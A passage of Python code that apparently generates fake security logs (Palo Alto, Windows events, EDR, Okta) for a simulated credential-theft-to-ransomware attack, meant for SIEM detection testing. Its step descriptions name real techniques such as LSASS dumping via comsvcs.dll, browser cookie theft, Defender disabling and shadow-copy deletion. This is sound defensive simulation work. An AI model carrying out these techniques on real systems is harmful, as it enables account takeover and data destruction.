        str(random.randint(2000, 25000)),  # bytes_sent
        str(random.randint(2000, 25000)),  # bytes_received
        str(random.randint(50, 500)),      # packets
        ts_str,                     # start
        str(random.randint(1, 120)),       # elapsed
        category,                   # category
        "",                         # future_use_4
        str(random.randint(1, 1000000)),   # seqno
        "0x0",                      # actionflags
        "US",                       # srcloc
        "MD",                       # dstloc
        "",                         # future_use_5
        str(random.randint(25, 250)),      # pkts_sent
        str(random.randint(25, 250)),      # pkts_received
        "aged-out",                 # session_end_reason
    ]

    expected_fields = 115
    if len(fields) < expected_fields:
        fields.extend([""] * (expected_fields - len(fields)))

    return ",".join(fields)

def _build_paloalto_c2_threat(
    base_time: datetime,
    minutes_offset: int,
    src_ip: str,
    dst_ip: str,
    dst_port: int,
    threat_category: str = "command-and-control",
    severity: str = "critical",
) -> str:
    """Build a deterministic Palo Alto THREAT CSV line for C2 detection."""
    now = base_time + timedelta(minutes=minutes_offset)
    ts_str = now.strftime("%Y/%m/%d %H:%M:%S")
    src_port = random.randint(49152, 65535)
    session_id = str(random.randint(100000, 999999))
    serial = f"{random.randint(100000000000000, 999999999999999)}"

    fields = [
        "",                         # future_use_1
        ts_str,                     # receive_time
        serial,                     # serial_number
        "THREAT",                   # type
        "spyware",                  # subtype
        "",                         # future_use_2
        ts_str,                     # time_generated
        src_ip,                     # src
        dst_ip,                     # dst
        src_ip,                     # natsrc
        dst_ip,                     # natdst
        "block-threats",            # rule
        f"{VICTIM_PROFILE['domain']}\\{VICTIM_PROFILE['username']}",  # srcuser
        "",                         # dstuser
        "ssl",                      # app
        "vsys1",                    # vsys
        "trust",                    # from
        "untrust",                  # to
        "ethernet1/1",              # inbound_if
        "ethernet1/2",              # outbound_if
        "FORWARD",                  # logset
        "",                         # future_use_3
        session_id,                 # sessionid
        "1",                        # repeatcnt
        str(src_port),              # sport
        str(dst_port),              # dport
        str(src_port),              # natsport
        str(dst_port),              # natdport
        "0x80000000",               # flags
        "tcp",                      # proto
        "alert",                    # action
        "(99999)",                  # threat/content name
        threat_category,            # category
        severity,                   # severity
        "client-to-server",         # direction
        str(random.randint(1, 1000000)),  # seqno
        "0x0",                      # actionflags
        "US",                       # srcloc
        "MD",                       # dstloc
        "",                         # future_use_5
        "",                         # contenttype
        "",                         # pcap_id
        "",                         # filedigest
        "",                         # cloud
        "",                         # url_idx
        ATTACKER_PROFILE["stolen_token_user_agent"],  # user_agent
        "",                         # filetype
        "",                         # xff
        "",                         # referer
        "",                         # sender
        "",                         # subject
        "",                         # recipient
        "",                         # reportid
    ]

    expected_fields = 120
    if len(fields) < expected_fields:
        fields.extend([""] * (expected_fields - len(fields)))

    return ",".join(fields)

def _build_wel_event(
    event_id: int,
    description: str,
    user: str,
    domain: str,
    computer: str,
    object_name: str = "",
    process_name: str = "",
    access_mask: str = "",
    privileges: str = "",
    service_name: str = "",
    service_state: str = "",
) -> str:
    """Build an escaped Windows Event Log string matching parser format."""
    security_id = f"S-1-5-21-{random.randint(100000000, 999999999)}-{random.randint(100000000, 999999999)}-{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}"
    logon_id = f"0x{random.randint(100000, 999999):x}"

    text = f"{description}\\r\\n\\r\\n"
    text += "Subject:\\r\\n"
    text += f"\\tSecurity ID:\\t\\t{security_id}\\r\\n"
    text += f"\\tAccount Name:\\t\\t{user}\\r\\n"
    text += f"\\tAccount Domain:\\t\\t{domain}\\r\\n"
    text += f"\\tLogon ID:\\t\\t{logon_id}\\r\\n\\r\\n"

    if object_name:
        text += "Object:\\r\\n"
        text += f"\\tObject Name:\\t\\t{object_name}\\r\\n"
        if process_name:
            text += f"\\tProcess Name:\\t\\t{process_name}\\r\\n"
        if access_mask:
            text += f"\\tAccess Mask:\\t\\t{access_mask}\\r\\n"
        text += "\\r\\n"

    if privileges:
        text += "Privileges:\\r\\n"
        text += f"\\t{privileges}\\r\\n\\r\\n"

    if service_name:
        text += f"Service Name:\\t{service_name}\\r\\n"
        text += f"Service State:\\t{service_state}\\r\\n"

    return text

# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

def generate_identity_theft_ransomware_scenario(
    siem_context: Optional[Dict] = None,
    include_helios_prefix: Optional[bool] = None,
) -> Dict:
    """Generate the complete Cross-Platform Identity Theft & Ransomware scenario.

    Returns a scenario dict with all events sorted chronologically.
    """

    if include_helios_prefix is None:
        include_helios_prefix = os.getenv('SCENARIO_INCLUDE_HELIOS_PREFIX', 'false').lower() == 'true'

    # Determine base time
    if siem_context and siem_context.get("anchors"):
        pre_resolved = siem_context["anchors"]
        if "credential_theft_start" in pre_resolved:
            ts = pre_resolved["credential_theft_start"]
            if isinstance(ts, dict):
                ts = ts.get("timestamp", ts)
            if isinstance(ts, str):
                base_time = datetime.fromisoformat(ts.replace("Z", "+00:00"))
            else:
                base_time = ts
        else:
            base_time = datetime.now(timezone.utc).replace(hour=10, minute=0, second=0, microsecond=0)
    else:
        base_time = datetime.now(timezone.utc).replace(hour=10, minute=0, second=0, microsecond=0)

    print("\n" + "=" * 80)
    print("🕷️  CROSS-PLATFORM IDENTITY THEFT & RANSOMWARE")
    print("=" * 80)
    print(f"Target: {VICTIM_PROFILE['name']} ({VICTIM_PROFILE['email']})")
    print(f"Department: {VICTIM_PROFILE['department']}")
    print(f"Hosts: {VICTIM_PROFILE['hostname']} → {VICTIM_PROFILE['hostname_secondary']}")
    print(f"Domain: {VICTIM_PROFILE['domain']}")
    print(f"Base Time: {base_time.isoformat()}")
    print("=" * 80 + "\n")

    alerts_enabled = os.getenv('SCENARIO_ALERTS_ENABLED', 'false').lower() == 'true'
    uam_config = None
    alert_results: List[Dict] = []
    if alerts_enabled:
        uam_ingest_url = os.getenv('UAM_INGEST_URL', '')
        uam_account_id = os.getenv('UAM_ACCOUNT_ID', '')
        uam_service_token = os.getenv('UAM_SERVICE_TOKEN', '')
        uam_site_id = os.getenv('UAM_SITE_ID', '')

        if uam_ingest_url and uam_account_id and uam_service_token:
            uam_config = {
                'uam_ingest_url': uam_ingest_url,
                'uam_account_id': uam_account_id,
                'uam_service_token': uam_service_token,
                'uam_site_id': uam_site_id,
            }
            print("\n  ALERT DETONATION ENABLED")
            print(f"   UAM Ingest: {uam_ingest_url}")
            print(f"   Account ID: {uam_account_id}")
            if uam_site_id:
                print(f"   Site ID: {uam_site_id}")
            if include_helios_prefix:
                print(f"   Include HELIOS prefix: Yes")
            print("=" * 80)
        else:
            print("  SCENARIO_ALERTS_ENABLED=true but UAM credentials missing")
            alerts_enabled = False

    all_events: List[Dict] = []

    phases = [
        ("🔑 PHASE 1 – Initial Access / Credential Theft", [
            ("Step 1: Browser/Token Dumping (EDR + WEL)", generate_step1_credential_dumping),
            ("Step 2: Stolen Refresh Token Redeemed (Okta)", generate_step2_token_redeem),
            ("Step 3: OAuth Consent Grant (Okta)", generate_step3_oauth_grant),
            ("Step 4: Impossible Travel / Anomalous Sign-In (Okta)", generate_step4_impossible_travel),
            ("Step 5: Persistent Session / New Device (Okta)", generate_step5_persistent_session),
        ]),
        ("📡 PHASE 2 – Command & Control", [
            ("Step 6: Primary C2 Connection (EDR + PAN)", generate_step6_c2_primary),
            ("Step 7: Secondary C2 Connections (EDR + PAN)", generate_step7_c2_secondary),
        ]),
        ("🔍 PHASE 3 – Endpoint Discovery & Staging", [
            ("Step 8: Discovery Commands / LOLBins (EDR)", generate_step8_discovery),
        ]),
        ("⚡ PHASE 4 – Credential & Privilege Abuse", [
            ("Step 9: LSASS Dump + Admin Role Grant (EDR + Okta)", generate_step9_privilege_escalation),
        ]),
        ("💣 PHASE 5 – Ransomware Preparation", [
            ("Step 10: Payload Staging + Defense Evasion (EDR)", generate_step10_ransomware_staging),
        ]),
        ("🔥 PHASE 6 – Ransomware Execution / Impact", [
            ("Step 11: Ransomware Detection + Encryption (EDR)", generate_step11_ransomware_execution),
            ("Step 12: VSS Deletion + Recovery Inhibition (EDR + WEL)", generate_step12_vss_deletion),
        ]),
    ]

    for phase_name, steps in phases:
        print(f"\n{phase_name}")
        print("-" * 80)
        for step_desc, generator_func in steps:
            step_events = generator_func(base_time)
            all_events.extend(step_events)
            print(f"   {step_desc} → {len(step_events)} events")

        if alerts_enabled and uam_config and phase_name in ALERT_PHASE_MAPPING:
            print(f"   ALERT DETONATION ENABLED")
            success = send_phase_alert(
                phase_name,
                base_time,
                uam_config,
                include_helios_prefix=include_helios_prefix,
            )
            alert_results.append({"phase": phase_name, "success": success})
            print(f"{' ' if success else ' '}")

    all_events.sort(key=lambda x: x["timestamp"])

    # Build summary
    source_counts = {}
    phase_counts = {}
    for e in all_events:
        src = e["source"]
        ph = e["phase"]
        source_counts[src] = source_counts.get(src, 0) + 1
        phase_counts[ph] = phase_counts.get(ph, 0) + 1

    scenario = {
        "scenario_id": f"identity-theft-ransomware-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
        "scenario_name": "Cross-Platform Identity Theft & Ransomware",
        "description": CORRELATION_CONFIG["description"],
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "timeline_start": base_time.isoformat(),
        "total_events": len(all_events),
        "correlation_details": {
            "victim_email": VICTIM_PROFILE["email"],
            "victim_username": VICTIM_PROFILE["username"],
            "victim_domain": VICTIM_PROFILE["domain"],
            "hostname_initial": VICTIM_PROFILE["hostname"],
            "hostname_secondary": VICTIM_PROFILE["hostname_secondary"],
            "c2_primary": ATTACKER_PROFILE["c2_ip_primary"],
            "c2_secondary": ATTACKER_PROFILE["c2_ip_secondary"],
            "ransomware": ATTACKER_PROFILE["ransomware_binary"],
            "ransomware_sha256": ATTACKER_PROFILE["ransomware_sha256"],
            "attacker_ip": ATTACKER_PROFILE["attacker_ip"],
        },
        "full_attack_chain": [
            {"phase": "Initial Access – Credential Theft", "step": 1, "log_source": "SentinelOne EDR + Windows Security", "event_type": "ProcessCreate / CredentialDumping", "description": f"esentutl.exe LOLBin copies Chrome Login Data & Cookies, PyInstaller stealer ({ATTACKER_PROFILE['credential_stealer_compiled']}) extracts OAuth refresh tokens on {VICTIM_PROFILE['hostname']}", "generated": True},
            {"phase": "Initial Access – Credential Theft", "step": 2, "log_source": "Okta", "event_type": "RefreshTokenRedeem / NonInteractiveSignIn", "description": f"Stolen refresh token for {VICTIM_PROFILE['email']} redeemed from {ATTACKER_PROFILE['attacker_ip']} ({ATTACKER_PROFILE['attacker_country']}) – no MFA challenge", "generated": True},
            {"phase": "Initial Access – Identity", "step": 3, "log_source": "Okta", "event_type": "OAuth2Grant", "description": f"OAuth consent grant for Mail.Read, Mail.ReadWrite, Calendars.Read scopes for {VICTIM_PROFILE['email']}", "generated": True},
            {"phase": "Initial Access – Identity", "step": 4, "log_source": "Okta", "event_type": "SignInRisk / ImpossibleTravel", "description": f"Impossible travel + New ASN + Unfamiliar Client detected for {VICTIM_PROFILE['email']} from {ATTACKER_PROFILE['attacker_city']}, {ATTACKER_PROFILE['attacker_country']}", "generated": True},
            {"phase": "Initial Access – Identity", "step": 5, "log_source": "Okta", "event_type": "NewDeviceRegistered / PersistentSession", "description": f"New device {ATTACKER_PROFILE['new_device_name']} enrolled (looks like IT dept), persistent session created without MFA", "generated": True},
            {"phase": "Command & Control", "step": 6, "log_source": "Palo Alto + SentinelOne", "event_type": "RemoteAccess / NetworkConnection", "description": f"ScreenConnect silently installed via msiexec, service connects to {ATTACKER_PROFILE['c2_domain_primary']}:{ATTACKER_PROFILE['c2_port']}", "generated": True},
            {"phase": "Command & Control", "step": 7, "log_source": "Palo Alto + SentinelOne", "event_type": "RemoteAccess / NetworkConnection", "description": f"ngrok reverse tunnel to {ATTACKER_PROFILE['c2_ip_secondary']}:{ATTACKER_PROFILE['c2_port_secondary']} + AnyDesk installed silently as backup C2", "generated": True},
            {"phase": "Endpoint Discovery & Staging", "step": 8, "log_source": "SentinelOne EDR", "event_type": "ProcessCreate / ScriptExecution", "description": f"SharpHound (BloodHound), ADRecon, csvde, net group, nltest via ScreenConnect shell on {VICTIM_PROFILE['hostname_secondary']}", "generated": True},
            {"phase": "Credential & Privilege Abuse", "step": 9, "log_source": "SentinelOne EDR + Okta", "event_type": "ProcessCreate / PrivEscalation", "description": f"LSASS dump via comsvcs.dll MiniDump + Okta SUPER_ADMIN role granted to {VICTIM_PROFILE['email']}", "generated": True},
            {"phase": "Ransomware Preparation", "step": 10, "log_source": "SentinelOne EDR", "event_type": "FileCreation / DefenseEvasion", "description": f"{ATTACKER_PROFILE['ransomware_family']} binary ({ATTACKER_PROFILE['ransomware_binary']}) + config staged, Defender disabled via Set-MpPreference, boot recovery disabled", "generated": True},
            {"phase": "Ransomware Execution / Impact", "step": 11, "log_source": "SentinelOne EDR", "event_type": "RansomwareDetection", "description": f"{ATTACKER_PROFILE['ransomware_family']} executed with --access-token, files encrypted with {ATTACKER_PROFILE['ransomware_extension']}, ransom notes ({ATTACKER_PROFILE['ransom_note']}) dropped on {VICTIM_PROFILE['hostname_secondary']}", "generated": True},
            {"phase": "Ransomware Execution / Impact", "step": 12, "log_source": "SentinelOne EDR + Windows Security", "event_type": "ServiceControl / VSSDelete", "description": f"VSS deleted (vssadmin + wmic), service disabled (sc.exe), boot policy set to ignoreallfailures on {VICTIM_PROFILE['hostname_secondary']}", "generated": True},
        ],
        "generated_phases": [
            {"name": phase_name, "events": count}
            for phase_name, count in phase_counts.items()
        ],
        "alerts": {
            "enabled": alerts_enabled,
            "sent": len([a for a in alert_results if a["success"]]),
            "failed": len([a for a in alert_results if not a["success"]]),
            "results": alert_results,
        },
        "source_breakdown": source_counts,
        "mitre_techniques": [
            "T1539 – Steal Web Session Cookie",
            "T1550.001 – Use Alternate Authentication Material: Application Access Token",
            "T1078 – Valid Accounts",
            "T1219 – Remote Access Software (ScreenConnect, AnyDesk, ngrok)",
            "T1218 – System Binary Proxy Execution (esentutl.exe)",
            "T1059.001 – Command and Scripting Interpreter: PowerShell",
            "T1003.001 – OS Credential Dumping: LSASS Memory",
            "T1069.002 – Permission Groups Discovery: Domain Groups",
            "T1018 – Remote System Discovery",
            "T1087.002 – Account Discovery: Domain Account (SharpHound, ADRecon)",
            "T1486 – Data Encrypted for Impact",
            "T1490 – Inhibit System Recovery",
            "T1562.001 – Impair Defenses: Disable or Modify Tools",
        ],
        "events": all_events,
    }

    print("\n" + "=" * 80)
    print("📊 SCENARIO SUMMARY")
    print("=" * 80)
    print(f"Total Events: {len(all_events)}")
    for src, cnt in source_counts.items():
        print(f"  - {src}: {cnt}")
    print(f"Timeline: {base_time.isoformat()} → ~{(base_time + timedelta(minutes=55)).isoformat()}")
    print("=" * 80)

    return scenario


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    scenario = generate_identity_theft_ransomware_scenario()

    preferred_dir = os.environ.get("SCENARIO_OUTPUT_DIR") or os.path.join(os.path.dirname(__file__), "configs")
    output_file = os.path.join(preferred_dir, "identity_theft_ransomware.json")

    def _attempt_save(path: str) -> bool:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                json.dump(scenario, f, indent=2)
            print(f"\n💾 Scenario saved to: {path}")
            print(f"   Events: {scenario['total_events']}")
            print("\nTo replay this scenario, use the scenario_hec_sender.py script:")
            print(f"   python scenario_hec_sender.py --scenario {path} --auto --preserve-timestamps")
            return True
        except OSError as e:
            if e.errno == errno.EROFS:
                print(f"⚠️  Read-only filesystem: {path}")
            else:
                print(f"⚠️  Failed to save: {path}: {e}")
            return False

    if not _attempt_save(output_file):
        pass
